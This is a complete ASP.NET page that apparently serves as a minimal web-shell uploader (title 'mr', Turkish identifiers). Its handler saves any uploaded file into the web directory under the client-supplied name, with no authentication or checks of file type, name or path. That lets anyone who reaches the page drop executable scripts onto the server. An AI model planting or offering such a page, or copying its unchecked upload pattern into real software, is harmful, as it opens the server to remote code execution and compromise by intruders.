<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">

protected void btnGonder_Click(object sender, EventArgs e)
{
if (uplDosya.HasFile)
{
uplDosya.SaveAs(Server.MapPath(".") + "\\" + uplDosya.FileName);
}
else
Response.Write("ok");
} 

</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
<title>mr</title>
</head>
<body>
<form id="form1" runat="server">
<div>
: <asp:FileUpload ID="uplDosya" runat="server" />
<br />
<asp:Button ID="bntGonder" runat="server" Text="Submit" OnClick="btnGonder_Click" />
</div>
</form>
</body>
</html>
